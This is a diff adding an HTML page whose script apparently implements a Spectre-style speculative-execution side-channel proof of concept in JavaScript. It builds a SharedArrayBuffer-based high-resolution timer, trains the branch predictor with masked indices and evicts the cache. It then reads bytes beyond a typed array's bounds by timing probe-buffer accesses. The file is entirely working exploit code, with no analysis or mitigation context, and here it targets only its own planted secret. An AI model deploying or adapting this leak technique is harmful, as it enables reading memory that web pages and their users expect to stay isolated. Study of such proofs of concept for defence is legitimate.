@@ -1,0 +1,201 @@
+<script>
+  "use strict";
+    
+  class Timer {
+    constructor() {
+      this.worker = new Worker("worker.js");
+      this.buffer = new Int32Array(new SharedArrayBuffer(16));
+
+      this.warmup();
+    }
+    warmup() {
+      try {
+        Atomics.store(this.buffer, 0, 0);
+        Atomics.store(this.buffer, 1, 0);
+        this.worker.postMessage(this.buffer);
+      } catch (e) {}
+    }
+    start() {
+      var buf = this.buffer;
+      Atomics.store(buf, 0, 0);
+      Atomics.store(buf, 1, 1);
+      this.worker.postMessage(this.buffer);
+      var watchdog = Date.now() + 1000;
+      while (Atomics.load(buf, 0) < 50) {
+        if (watchdog < Date.now()) {
+          throw new Error("Timer timeout");
+        }
+      }      
+      this.stamp = Atomics.load(buf, 0);
+    }
+    
+    stop() {
+      var end = Atomics.load(this.buffer, 0);
+      Atomics.store(this.buffer, 1, 0);
+      return end - this.stamp;
+    }
+  }
+  
+  function minIndex(arr) {
+    var val = 0, idx = -1;
+    for (var i = 0; i < arr.length; i++) {
+      if ((idx < 0) || (arr[i] < val)) {
+        val = arr[i];
+        idx = i;
+      }
+    }
+    return idx;
+  }
+  function mymain() {
+    var _timer = new Timer();
+    var _acc = 0;
+    var _times = new Int32Array(256);
+    
+    console.log("Warming...");
+    setTimeout(function() {
+      const _evict = new Uint32Array(4 * 1024 * 1024);
+      const PAGE_SIZE = 512;
+      // must be power of two so the index masking doesn't break the index
+      const _buffer = new Uint8Array(256 * PAGE_SIZE * 2);
+      const _padding2 = new Uint8Array(PAGE_SIZE * 2);
+      
+      const _probe_buffer = new ArrayBuffer(2 * 8192);
+      const _probe_length = 1024;
+      const _probe = new Uint8Array(_probe_buffer, 0, _probe_length);
+      const _secret = new Uint8Array(_probe_buffer, _probe_length, 32);
+      
+      for (var i = 0; i < _evict.length; i++) {
+        _evict[i] = i * 2;
+      }
+      for (var i = 0; i < _buffer.length; i++) {
+        _buffer[i] = i * 4;
+      }
+      for (var i = 0; i < _padding2.length; i++) {
+        _padding2[i] = i * 5;
+      }
+      for (var i = 0; i < _probe.length; i++) {
+        _probe[i] = i * 6;
+      }
+      for (var i = 0; i < _secret.length; i++) {
+        _secret[i] = i * 7;
+      }
+      _probe[_probe_length - 4] = 13;
+      _probe[_probe_length - 3] = 37;
+      _probe[_probe_length - 2] = 99;
+      _probe[_probe_length - 1] = 255;
+      _secret[0] = 7;
+      _secret[1] = 6;
+      _secret[2] = 5;
+      _secret[3] = 4;
+      _secret[4] = 3;
+      _secret[5] = 2;
+        
+      function measure(index) {
+        const probe = _probe;
+        const timer = _timer;
+        const times = _times;
+        const evict = _evict;
+        const buffer = _buffer;
+        var acc = 0;
+
+        for (var runId = -20; ; runId++)
+        {
+          var temp_idx = index|0;
+          
+          // train predictor
+          if (runId <= 0) {
+            temp_idx = (temp_idx & 0xf) |0;
+          }
+          
+          for (var i = 0; i < evict.length; i += 31) {
+            acc ^= evict[i];
+          }
+          
+          // acc ^= probe[0];
+          timer.start();
+          acc ^= buffer.length;
+          acc ^= probe.length;
+          acc ^= _secret[0];
+          acc ^= timer.stop();
+          
+          if (temp_idx|0 < probe.length) {
+            temp_idx = probe[temp_idx|0]|0;
+            temp_idx = (((temp_idx * PAGE_SIZE)|0) + PAGE_SIZE)|0;
+            const MASK = (buffer.length-1)|0;
+            temp_idx = ((temp_idx|0) & (MASK|0)) |0;
+            acc ^= buffer[temp_idx|0]|0;
+          }
+          
+          for (var i = 0; i < 256; i++) {
+            var temp_idx = (i * PAGE_SIZE + PAGE_SIZE)|0;
+            if (temp_idx|0 < buffer.length) {
+              timer.start();
+              var temp = buffer[temp_idx|0];
+              var delta = timer.stop();
+              acc ^= temp;
+              times[i] += delta;
+            }
+          }
+          
+          if (runId == 0) {
+            times.fill(0);
+          }
+          if (runId >= 5) {
+            self.dumper = acc;
+            return times;
+          }
+        }
+      }
+      
+      async function measure_agreement(index) {
+        var history = new Int32Array(3);
+        history.fill(-1);
+        for (var trials = 0; ; trials++) {
+          var times = measure(index);
+          var leak = minIndex(times);
+          
+          history[trials % history.length] = leak;
+          
+          if (history.every(x => x === leak)) {
+            return leak;
+          }
+          
+          if (trials > 200) {
+            console.log(history);
+            throw new Error("Couldn't read byte at " + index);
+          }
+          await delay(1);
+        }
+      }
+      
+      function delay(x) { 
+        return new Promise(resolve => {
+          setTimeout(resolve, x);
+        });
+      }
+      async function measure_all(cb) {
+        var rebuffer = new Int32Array(16);
+        for (var i = 0; i < 16; i++) {
+          var leaked = await measure_agreement(_probe_length - 4 + i);
+          rebuffer[i] = leaked;
+          console.log(i, leaked);
+          await delay(10);
+        }
+        return rebuffer;
+      }
+      async function foo() {
+        console.log("Measuring...");
+        measure_all(function(rebuffer) {
+          console.log(rebuffer);
+        });
+      }
+      foo();
+    }, 1000);
+  }
+  
+  mymain();
+  
+  
+</script>
+
+
